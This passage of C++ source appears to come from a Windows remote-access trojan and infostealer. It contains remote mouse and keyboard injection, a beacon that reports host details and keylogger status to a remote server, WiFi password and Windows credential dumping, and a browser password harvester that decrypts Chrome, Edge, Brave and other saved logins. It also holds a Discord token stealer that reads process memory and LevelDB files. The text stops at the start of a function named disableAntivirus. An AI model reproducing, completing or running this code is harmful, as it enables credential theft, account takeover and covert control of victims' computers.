    if (name.empty()) return "err:empty";
    std::string r = execCmd("taskkill /f /im \"" + name + "\"");
    return r.find("SUCCESS") != std::string::npos || r.find("success") != std::string::npos ? "ok" : r;
}

std::string handleMouse(const std::string& payload) {
    std::string xs=extractJson(payload,"x");
    std::string ys=extractJson(payload,"y");
    std::string action=extractJson(payload,"action");
    std::string ds=extractJson(payload,"delta");
    if(xs.empty()||ys.empty()||action.empty()) return "bad_payload";
    int x=std::stoi(xs); int y=std::stoi(ys);
    ScreenRect sr=getScreenRect(g_liveMonitor);
    int sw=sr.w; int sh=sr.h; int sx=sr.x; int sy=sr.y;
    auto toAbs=[&](int px,int py){INPUT in={0};in.type=INPUT_MOUSE;in.mi.dx=((px-sx)*65535)/sw;in.mi.dy=((py-sy)*65535)/sh;in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE;return in;};
    INPUT in={0};in.type=INPUT_MOUSE;
    in.mi.dx=((x-sx)*65535)/sw; in.mi.dy=((y-sy)*65535)/sh; in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE;
    if(action=="move") in.mi.dwFlags|=MOUSEEVENTF_MOVE;
    else if(action=="down") in.mi.dwFlags|=MOUSEEVENTF_LEFTDOWN;
    else if(action=="up") in.mi.dwFlags|=MOUSEEVENTF_LEFTUP;
    else if(action=="right_down") in.mi.dwFlags|=MOUSEEVENTF_RIGHTDOWN;
    else if(action=="right_up") in.mi.dwFlags|=MOUSEEVENTF_RIGHTUP;
    else if(action=="middle_down") in.mi.dwFlags|=MOUSEEVENTF_MIDDLEDOWN;
    else if(action=="middle_up") in.mi.dwFlags|=MOUSEEVENTF_MIDDLEUP;
    else if(action=="double") {
        INPUT d1={0};d1.type=INPUT_MOUSE;d1.mi.dx=((x-sx)*65535)/sw;d1.mi.dy=((y-sy)*65535)/sh;d1.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN;
        INPUT u1={0};u1.type=INPUT_MOUSE;u1.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP;
        SendInput(1,&d1,sizeof(d1));Sleep(10);SendInput(1,&u1,sizeof(u1));Sleep(10);
        SendInput(1,&d1,sizeof(d1));Sleep(10);SendInput(1,&u1,sizeof(u1));
        return "ok";
    }
    else if(action=="scroll") { int d=0;try{d=std::stoi(ds);}catch(...){d=120;} in.mi.dwFlags=MOUSEEVENTF_WHEEL; in.mi.mouseData=d; SendInput(1,&in,sizeof(in)); return "ok"; }
    else if(action=="drag") {
        INPUT dn={0};dn.type=INPUT_MOUSE;dn.mi.dx=((x-sx)*65535)/sw;dn.mi.dy=((y-sy)*65535)/sh;dn.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN;
        SendInput(1,&dn,sizeof(dn));
        return "ok_dragging";
    }
    else if(action=="dragto") {
        INPUT mv=toAbs(x,y);
        SendInput(1,&mv,sizeof(mv));
        return "ok_moved";
    }
    else if(action=="release") {
        INPUT rel={0};rel.type=INPUT_MOUSE;rel.mi.dwFlags=MOUSEEVENTF_LEFTUP;
        SendInput(1,&rel,sizeof(rel));
        return "ok_released";
    }
    else return "bad_action";
    SendInput(1,&in,sizeof(in));
    return "ok";
}

std::string handleKeyboard(const std::string& payload) {
    std::string ks=extractJson(payload,"key");
    std::string action=extractJson(payload,"action");
    if(ks.empty()||action.empty()) return "bad_payload";
    std::string combo=extractJson(payload,"combo");
    auto sendKey=[&](WORD vk, bool up)->void{
        INPUT in={0};in.type=INPUT_KEYBOARD;in.ki.wVk=vk;
        if(up) in.ki.dwFlags|=KEYEVENTF_KEYUP;
        SendInput(1,&in,sizeof(in));
    };
    if(!combo.empty()) {
        std::vector<WORD> keys;
        size_t p=0;
        while(p<combo.size()) {
            size_t sep=combo.find(',',p);
            std::string tok=combo.substr(p,sep==std::string::npos?std::string::npos:sep-p);
            while(!tok.empty()&&tok[0]==' ')tok=tok.substr(1);
            keys.push_back((WORD)std::stoi(tok));
            if(sep==std::string::npos) break;
            p=sep+1;
        }
        bool isUp=(action=="up");
        for(WORD k:keys) sendKey(k,isUp);
        return "ok";
    }
    WORD vk=(WORD)std::stoi(ks);
    sendKey(vk,action=="up");
    return "ok";
}

void sendPing() {
    std::string ts = getTimestamp();
    SYSTEM_INFO si; GetSystemInfo(&si);
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    int monCount = GetSystemMetrics(SM_CMONITORS);
    std::string body = "{\"ip\":\"" + publicIP + "\",\"created_at\":\"" + ts + "\","
        "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ","
        "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ","
        "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ","
        "\"monitors\":" + std::to_string(monCount) + ","
        "\"keylog\":" + std::string(g_keylogRunning ? "true" : "false") + ","
        "\"uptime\":" + std::to_string(GetTickCount64() / 1000) + ","
        "\"version\":\"2.0\""
        "}";
    httpsPut("/pings/" + fbEsc(computerName) + ".json", body);
}

std::string listProcesses() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "[]";
    PROCESSENTRY32 pe = {sizeof(pe)};
    std::string out = "[";
    BOOL ok = Process32First(snap, &pe);
    while (ok) {
        if (out.size() > 1) out += ",";
        out += "{\"n\":\"" + jsonEscape(pe.szExeFile) + "\",\"p\":" + std::to_string(pe.th32ProcessID) + "}";
        ok = Process32Next(snap, &pe);
    }
    CloseHandle(snap);
    out += "]";
    return out;
}

std::string killProcess(const std::string& payload) {
    int pid = 0;
    try { pid = std::stoi(payload); } catch(...) { return "bad_pid"; }
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h) { TerminateProcess(h, 0); CloseHandle(h); return "ok"; }
    std::string cmd = "taskkill /f /pid " + std::to_string(pid);
    std::string r = execCmd(cmd);
    if (r.find("success") != std::string::npos || r.find("SUCCESS") != std::string::npos) return "ok";
    return "access_denied";
}

std::string getSystemInfo() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    ULARGE_INTEGER freeB, totalB, totalF;
    std::string disks = "[";
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char root[4] = {(char)('A'+i), ':', '\\', 0};
            if (GetDriveTypeA(root) == DRIVE_FIXED && GetDiskFreeSpaceExA(root, &freeB, &totalB, &totalF)) {
                if (disks.size() > 1) disks += ",";
                disks += "{\"d\":\"" + std::string(1, root[0]) + "\",\"t\":" + std::to_string(totalB.QuadPart / (1024*1024)) + ",\"f\":" + std::to_string(freeB.QuadPart / (1024*1024)) + "}";
            }
        }
    }
    disks += "]";
    char compName[MAX_PATH+1]; DWORD csz = MAX_PATH;
    GetComputerNameA(compName, &csz);
    std::string out = "{";
    out += "\"host\":\"" + jsonEscape(compName) + "\",";
    out += "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ",";
    out += "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ",";
    out += "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ",";
    out += "\"disks\":" + disks;
    out += "}";
    return out;
}

std::string getPasswords() {
    std::string out = "=== WiFi Passwords ===\n";
    std::string profiles = execCmd("netsh wlan show profiles");
    size_t pos = 0; int cnt = 0;
    while ((pos = profiles.find("All User Profile", pos)) != std::string::npos) {
        size_t colon = profiles.find(":", pos);
        if (colon == std::string::npos) break;
        size_t start = profiles.find_first_not_of(" \t\r\n", colon + 1);
        if (start == std::string::npos) break;
        size_t end = profiles.find("\r\n", start);
        if (end == std::string::npos) end = profiles.size();
        std::string name = profiles.substr(start, end - start);
        while (!name.empty() && (name.back() == ' ' || name.back() == '\r' || name.back() == '\n')) name.pop_back();
        if (name.empty()) { pos = end; continue; }
        cnt++;
        out += "\n[" + std::to_string(cnt) + "] " + name + "\n";
        std::string keyInfo = execCmd("netsh wlan show profile name=\"" + name + "\" key=clear");
        size_t kpos = keyInfo.find("Key Content");
        if (kpos != std::string::npos) {
            size_t kcolon = keyInfo.find(":", kpos);
            size_t kstart = keyInfo.find_first_not_of(" \t\r\n", kcolon + 1);
            size_t kend = keyInfo.find("\r\n", kstart);
            if (kend == std::string::npos) kend = keyInfo.find("\n", kstart);
            if (kend == std::string::npos) kend = keyInfo.size();
            out += "  Password: " + keyInfo.substr(kstart, kend - kstart) + "\n";
        } else out += "  Password: (not found/blank)\n";
        pos = end;
    }
    if (cnt == 0) out += "  (no WiFi profiles)\n";
    out += "\n=== Windows Credentials ===\n";
    out += execCmd("cmdkey /list");
    return out;
}

std::string getNetworkInfo() {
    std::string out = "=== IP Configuration ===\n";
    out += execCmd("ipconfig /all");
    out += "\n=== Active Connections ===\n";
    out += execCmd("netstat -an");
    out += "\n=== ARP Table ===\n";
    out += execCmd("arp -a");
    out += "\n=== Routing Table ===\n";
    out += execCmd("route print");
    return out;
}

std::string getServices() { return execCmd("sc query state= all"); }

std::string getInstalledApps() {
    return execCmd("powershell -c \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Format-Table -AutoSize -Wrap | Out-String -Width 4096\"");
}

// Forward declarations for token decryption helpers (defined later)
std::string getChromeKey(const std::string& localStatePath);
std::string decryptChromeValue(const std::string& encValue, const std::string& aesKey);

// --- Browser password harvester (SQLite + os_crypt) ---
std::string getBrowserPasswords() {
    std::string out;
    char la[MAX_PATH];
    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
    if (laLen == 0 || laLen > MAX_PATH) return "No local appdata";
    std::string localAppData(la, laLen);

    struct BPath { const char* path; const char* label; };
    BPath profiles[] = {
        {"\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome"},
        {"\\Google\\Chrome\\User Data\\Profile 1\\Login Data", "Chrome-P1"},
        {"\\Google\\Chrome\\User Data\\Profile 2\\Login Data", "Chrome-P2"},
        {"\\Google\\Chrome\\User Data\\Profile 3\\Login Data", "Chrome-P3"},
        {"\\Google\\Chrome\\User Data\\Profile 4\\Login Data", "Chrome-P4"},
        {"\\Google\\Chrome\\User Data\\Profile 5\\Login Data", "Chrome-P5"},
        {"\\Microsoft\\Edge\\User Data\\Default\\Login Data", "Edge"},
        {"\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data", "Edge-P1"},
        {"\\Microsoft\\Edge\\User Data\\Profile 2\\Login Data", "Edge-P2"},
        {"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "Brave"},
        {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Login Data", "Brave-P1"},
        {"\\Opera Software\\Opera Stable\\Login Data", "Opera"},
        {"\\Vivaldi\\User Data\\Default\\Login Data", "Vivaldi"},
        {"\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data", "Yandex"},
    };

    // Get the os_crypt AES key from Chrome's Local State (shared across Chromium browsers)
    std::string aesKey = getChromeKey(localAppData + "\\Google\\Chrome\\User Data\\Local State");

    char tmpPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmpPath)) tmpPath[0] = 0;

    // Forward declare these from token decryption helpers (below)
    // These will be resolved at link time
    
    for (auto& bp : profiles) {
        std::string src = localAppData + bp.path;
        WIN32_FIND_DATAA wfd;
        HANDLE hFind = FindFirstFileA(src.c_str(), &wfd);
        if (hFind == INVALID_HANDLE_VALUE) continue;
        FindClose(hFind);
        
        std::string tmp = std::string(tmpPath) + "bp_" + std::to_string(GetTickCount()) + ".tmp";
        if (!CopyFileA(src.c_str(), tmp.c_str(), FALSE)) continue;

        sqlite3* db = NULL;
        if (sqlite3_open(tmp.c_str(), &db) != SQLITE_OK) { DeleteFileA(tmp.c_str()); continue; }
        
        const char* sql = "SELECT origin_url, username_value, password_value, signon_realm FROM logins";
        sqlite3_stmt* stmt = NULL;
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
            sqlite3_close(db); DeleteFileA(tmp.c_str()); continue;
        }

        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* user = (const char*)sqlite3_column_text(stmt, 1);
            const void* pwBlob = sqlite3_column_blob(stmt, 2);
            int pwLen = sqlite3_column_bytes(stmt, 2);
            if (!url || !user || !pwBlob || pwLen < 5) continue;

            std::string password;
            if (!aesKey.empty()) {
                std::string enc((const char*)pwBlob, pwLen);
                password = decryptChromeValue(enc, aesKey);
            }
            if (password.empty()) {
                // Try DPAPI fallback for older Chrome versions
                DATA_BLOB inBlob = { (DWORD)pwLen, const_cast<BYTE*>((const BYTE*)pwBlob) };
                DATA_BLOB outBlob = {};
                if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
                    password.assign((char*)outBlob.pbData, outBlob.cbData);
                    LocalFree(outBlob.pbData);
                }
            }

            if (!password.empty()) {
                count++;
                if (count == 1) out += "\n[" + std::string(bp.label) + "]\n";
                out += std::string(url) + "\n";
                out += "  User: " + std::string(user) + "\n";
                out += "  Pass: " + password + "\n\n";
            }
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileA(tmp.c_str());
        if (count > 0) out += "--- " + std::string(bp.label) + ": " + std::to_string(count) + " credentials ---\n";
    }
    if (out.empty()) out = "No saved credentials found in any browser";
    return out;
}
// --- End browser password harvester ---

// --- Token decryption helpers ---
std::string dpapiDecrypt(const std::vector<unsigned char>& input) {
    DATA_BLOB inBlob = { (DWORD)input.size(), const_cast<BYTE*>(input.data()) };
    DATA_BLOB outBlob = {};
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
        std::string r((char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData); return r;
    }
    return "";
}
std::string aesGcmDecrypt(const std::string& key, const std::string& nonce, const std::string& ciphertext, const std::string& tag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    std::string result;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return result;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
        { BCryptCloseAlgorithmProvider(hAlg, 0); return result; }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0)
        { BCryptCloseAlgorithmProvider(hAlg, 0); return result; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce.data();
    authInfo.cbNonce = (ULONG)nonce.size();
    authInfo.pbTag = (PUCHAR)tag.data();
    authInfo.cbTag = (ULONG)tag.size();
    std::vector<BYTE> output(ciphertext.size() + 16);
    ULONG outSize = 0;
    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, output.data(), (ULONG)output.size(), &outSize, 0) == 0)
        result.assign((char*)output.data(), outSize);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}
std::string decryptChromeValue(const std::string& encValue, const std::string& aesKey) {
    if (encValue.size() < 15 || (encValue[0] != 'v' && encValue[0] != 'V')) return "";
    size_t prefix = 3; // skip "v10" or "v11"
    if (encValue.size() < prefix + 12 + 16) return "";
    std::string nonce = encValue.substr(prefix, 12);
    std::string ct = encValue.substr(prefix + 12, encValue.size() - prefix - 12 - 16);
    std::string tag = encValue.substr(encValue.size() - 16);
    return aesGcmDecrypt(aesKey, nonce, ct, tag);
}
std::string getChromeKey(const std::string& localStatePath) {
    HANDLE f = CreateFileA(localStatePath.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (f == INVALID_HANDLE_VALUE) return "";
    DWORD sz = GetFileSize(f, 0);
    if (sz < 100 || sz > 0x100000) { CloseHandle(f); return ""; }
    std::vector<char> buf(sz); DWORD rd = 0;
    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd < 100) { CloseHandle(f); return ""; }
    CloseHandle(f);
    std::string s(buf.data(), rd);
    size_t p = s.find("\"encrypted_key\"");
    if (p == std::string::npos) return "";
    size_t v = s.find('"', p + 15);
    if (v == std::string::npos) return "";
    v++; size_t ve = s.find('"', v);
    if (ve == std::string::npos) return "";
    std::string b64 = s.substr(v, ve - v);
    auto decoded = base64Decode(b64);
    if (decoded.size() < 10) return "";
    // Strip "DPAPI" prefix (5 bytes)
    std::vector<BYTE> encKey(decoded.begin() + 5, decoded.end());
    return dpapiDecrypt(encKey);
}
// --- End token decryption helpers ---

bool isTokenChar(char c) {
    return (c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='_'||c=='-';
}
std::string extractTokensFromBuf(const std::string& s, const std::string& label, const std::string& used) {
    std::string out;
    auto has = [&](const std::string& t) { return used.find(t) != std::string::npos || out.find(t) != std::string::npos; };
    // mfa. tokens
    size_t p = 0;
    while ((p = s.find("mfa.", p)) != std::string::npos) {
        size_t e = p + 4; while (e < s.size() && isTokenChar(s[e])) e++;
        std::string t = s.substr(p, e - p);
        if (t.size() > 20 && !has(t)) { out += "[" + label + "] " + t + "\n"; }
        p = e;
    }
    // standard xxx.yyy.zzz tokens
    for (size_t i = 0; i < s.size(); i++) {
        if (!isTokenChar(s[i])) continue;
        size_t a = i;
        while (i < s.size() && isTokenChar(s[i])) i++;
        std::string p1 = s.substr(a, i - a);
        if (p1.size() >= 18 && p1.size() <= 28 && i < s.size() && s[i] == '.') {
            size_t j = i + 1; if (j >= s.size()) break;
            size_t b = j; while (j < s.size() && isTokenChar(s[j])) j++;
            std::string p2 = s.substr(b, j - b);
            if (p2.size() >= 4 && p2.size() <= 10 && j < s.size() && s[j] == '.') {
                j++; size_t c = j; while (j < s.size() && isTokenChar(s[j])) j++;
                std::string p3 = s.substr(c, j - c);
                if (p3.size() >= 20 && p3.size() <= 32) {
                    std::string token = p1 + "." + p2 + "." + p3;
                    if (!has(token)) out += "[" + label + "] " + token + "\n";
                }
            }
        }
    }
    // json "token" key
    size_t tp = 0;
    while ((tp = s.find("\"token\"", tp)) != std::string::npos) {
        size_t vp = s.find('"', tp + 7);
        if (vp == std::string::npos || vp > tp + 20) { tp++; continue; }
        vp++; size_t ve = s.find('"', vp);
        while (ve < s.size() && ve > 0 && s[ve-1] == '\\') ve = s.find('"', ve+1);
        if (ve != std::string::npos && ve - vp > 20) {
            std::string t = s.substr(vp, ve - vp);
            if (!has(t)) out += "[" + label + "-json] " + t + "\n";
        }
        tp = ve != std::string::npos ? ve + 1 : tp + 1;
    }
    return out;
}

std::string scanDiscordProcessMemory() {
    std::string out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) do {
        std::string exe = pe.szExeFile;
        for (auto& c : exe) if (c >= 'A' && c <= 'Z') c += 32;
        if (exe.find("discord") == std::string::npos) continue;
        if (exe.find("update") != std::string::npos || exe.find("setup") != std::string::npos) continue;
        HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
        if (!proc) continue;
        SYSTEM_INFO si; GetSystemInfo(&si);
        uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
        const uintptr_t maxAddr = (uintptr_t)si.lpMaximumApplicationAddress;
        DWORD pid = pe.th32ProcessID;
        while (addr < maxAddr) {
            MEMORY_BASIC_INFORMATION mbi;
            if (VirtualQueryEx(proc, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 0x10000; continue; }
            if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE &&
                (mbi.Protect & 0xFF) == PAGE_READWRITE && mbi.RegionSize > 200 && mbi.RegionSize < 0x4000000) {
                std::vector<char> buf(mbi.RegionSize);
                SIZE_T rd = 0;
                if (ReadProcessMemory(proc, mbi.BaseAddress, buf.data(), mbi.RegionSize, &rd) && rd > 100) {
                    std::string s(buf.data(), rd);
                    out += extractTokensFromBuf(s, "Discord-PID:" + std::to_string(pid), out);
                }
            }
            addr += mbi.RegionSize;
        }
        CloseHandle(proc);
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return out;
}

void scanLevelDBWithKey(const std::string& dir, const std::string& label, const std::string& aesKey,
                        std::string& out, std::string& used) {
    std::string tmpDir;
    char tmpPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tmpPath)) tmpDir = tmpPath;
    auto scanOne=[&](const std::string& filePath) {
        std::string tmp = tmpDir + "dt_" + std::to_string(GetTickCount()) + ".tmp";
        if (!CopyFileA(filePath.c_str(), tmp.c_str(), FALSE)) return;
        HANDLE f = CreateFileA(tmp.c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (f == INVALID_HANDLE_VALUE) { DeleteFileA(tmp.c_str()); return; }
        DWORD sz = GetFileSize(f, 0);
        if (sz > 0 && sz < 0x200000) {
            std::vector<char> buf(sz); DWORD rd = 0;
            if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
                std::string s(buf.data(), rd);
                // plaintext extraction
                std::string plain = extractTokensFromBuf(s, label, used + out);
                if (!plain.empty()) { out += "\n[" + label + "]\n" + plain; }
                // os_crypt decryption if we have key
                if (!aesKey.empty()) {
                    size_t cp = 0;
                    while ((cp = s.find("v10", cp)) != std::string::npos || (cp = s.find("v11", cp)) != std::string::npos) {
                        // try extracting surrounding context for the value
                        size_t start = cp;
                        size_t end = cp + 3;
                        // find the end of the v10/v11 value (next non-base64ish or end)
                        while (end < s.size() && (isTokenChar(s[end]) || s[end] == '/' || s[end] == '+' || s[end] == '=')) end++;
                        std::string enc = s.substr(start, end - start);
                        if (enc.size() > 30) {
                            std::string dec = decryptChromeValue(enc, aesKey);
                            if (!dec.empty() && dec.size() > 5) {
                                std::string t = extractTokensFromBuf(dec, label + "-dec", used + out);
                                if (!t.empty()) out += t;
                            }
                        }
                        cp = end;
                    }
                }
            }
        }
        CloseHandle(f); DeleteFileA(tmp.c_str());
    };
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA((dir + "*.ldb").c_str(), &fd);
    if (hf != INVALID_HANDLE_VALUE) { do { scanOne(dir + fd.cFileName); } while (FindNextFileA(hf, &fd)); FindClose(hf); }
    hf = FindFirstFileA((dir + "*.log").c_str(), &fd);
    if (hf != INVALID_HANDLE_VALUE) { do { scanOne(dir + fd.cFileName); } while (FindNextFileA(hf, &fd)); FindClose(hf); }
}

std::string getDiscordTokens() {
    std::string out;
    std::string used; // track seen tokens
    auto addTok = [&](const std::string& block) { if (!block.empty()) { out += block; used += block; } };
    // 1. Process memory scanning (most reliable)
    addTok(scanDiscordProcessMemory());
    
    char ad[MAX_PATH], la[MAX_PATH];
    DWORD adLen = GetEnvironmentVariableA("APPDATA", ad, MAX_PATH);
    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
    std::string appData(ad, adLen > 0 && adLen <= MAX_PATH ? adLen : 0);
    std::string localAppData(la, laLen > 0 && laLen <= MAX_PATH ? laLen : 0);
    
    // 2. Get Chrome AES key for os_crypt decryption (try multiple paths)
    std::string chromeKey;
    if (!localAppData.empty()) {
        const char* keyPaths[] = {
            "\\discord\\Local State",
            "\\discordptb\\Local State",
            "\\discordcanary\\Local State",
            "\\discorddevelopment\\Local State",
        };
        for (auto* kp : keyPaths) {
            chromeKey = getChromeKey(localAppData + kp);
            if (!chromeKey.empty() && chromeKey.size() == 32) break;
        }
        // Also try browser local state (same encryption key)
        if (chromeKey.empty() || chromeKey.size() != 32) {
            chromeKey = getChromeKey(localAppData + "\\Google\\Chrome\\User Data\\Local State");
        }
    }
    if (chromeKey.size() != 32) chromeKey.clear(); // AES-256 key must be 32 bytes
    
    // 3. Scan Discord client LevelDB files
    const char* clients[] = {"discord","discordptb","discordcanary","discorddevelopment"};
    if (!appData.empty()) {
        for (const char* cl : clients) {
            std::string dir = appData + "\\" + cl + "\\Local Storage\\leveldb\\";
            scanLevelDBWithKey(dir, cl, chromeKey, out, used);
        }
    }
    if (!localAppData.empty()) {
        for (const char* cl : clients) {
            std::string dir = localAppData + "\\" + cl + "\\Local Storage\\leveldb\\";
            scanLevelDBWithKey(dir, std::string(cl) + "(local)", chromeKey, out, used);
        }
        // Also scan session storage files directly
        for (const char* cl : clients) {
            std::string dir = localAppData + "\\" + cl + "\\Session Storage\\";
            WIN32_FIND_DATAA fd;
            HANDLE hf = FindFirstFileA((dir + "*.log").c_str(), &fd);
            if (hf != INVALID_HANDLE_VALUE) {
                char tp[MAX_PATH]; GetTempPathA(MAX_PATH, tp);
                do {
                    std::string fp = dir + fd.cFileName;
                    std::string tn = std::string(tp) + "dt_" + std::to_string(GetTickCount()) + ".tmp";
                    if (CopyFileA(fp.c_str(), tn.c_str(), FALSE)) {
                        HANDLE f = CreateFileA(tn.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
                        if (f != INVALID_HANDLE_VALUE) {
                            DWORD sz = GetFileSize(f, 0);
                            if (sz > 0 && sz < 0x200000) {
                                std::vector<char> buf(sz); DWORD rd = 0;
                                if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
                                    std::string s(buf.data(), rd);
                                    std::string t = extractTokensFromBuf(s, cl, used + out);
                                    if (!t.empty()) out += "\n[" + std::string(cl) + "-session]\n" + t;
                                }
                            }
                            CloseHandle(f);
                        }
                        DeleteFileA(tn.c_str());
                    }
                } while (FindNextFileA(hf, &fd));
                FindClose(hf);
            }
        }
    }
    
    // 4. Scan browser profiles with os_crypt decryption
    if (!localAppData.empty()) {
        struct BrowserPath { const char* path; const char* label; };
        BrowserPath browsers[] = {
            {"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", "Chrome"},
            {"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Chrome-P1"},
            {"\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", "Chrome-P2"},
            {"\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\", "Chrome-P3"},
            {"\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\", "Chrome-P4"},
            {"\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\", "Chrome-P5"},
            {"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", "Edge"},
            {"\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Edge-P1"},
            {"\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\", "Edge-P2"},
            {"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\", "Brave"},
            {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Brave-P1"},
            {"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", "Opera"},
            {"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", "Vivaldi"},
            {"\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\", "Yandex"},
        };
        // Get browser AES key if we don't have one yet
        std::string browserKey = chromeKey;
        if (browserKey.empty()) {
            browserKey = getChromeKey(localAppData + "\\Google\\Chrome\\User Data\\Local State");
            if (browserKey.size() != 32) browserKey.clear();
        }
        for (auto& bp : browsers) {
            std::string dir = localAppData + bp.path;
            scanLevelDBWithKey(dir, bp.label, browserKey, out, used);
        }
    }
    
    // 5. Scan modded Discord clients
    if (!appData.empty()) {
        struct ModPath { const char* path; const char* label; };
        ModPath mods[] = {
            {"\\BetterDiscord\\storage\\leveldb\\", "BetterDiscord"},
            {"\\Vencord\\storage\\leveldb\\", "Vencord"},
            {"\\Equicord\\storage\\leveldb\\", "Equicord"},
            {"\\DiscordBot\\storage\\leveldb\\", "DiscordBot"},
        };
        for (auto& m : mods) {
            std::string dir = appData + m.path;
            scanLevelDBWithKey(dir, m.label, chromeKey, out, used);
        }
    }
    
    if (out.empty()) out = "No Discord tokens found";
    return out;
}

void killProcessByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = {sizeof(pe)};
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) {
            HANDLE p = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (p) { TerminateProcess(p, 1); CloseHandle(p); }
        }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
}

DWORD WINAPI mouseLock10(LPVOID) {
    DWORD start = GetTickCount();
    while (GetTickCount() - start < 10000) { SetCursorPos(0, 0); Sleep(30); }
    return 0;
}

void disableAntivirus() {
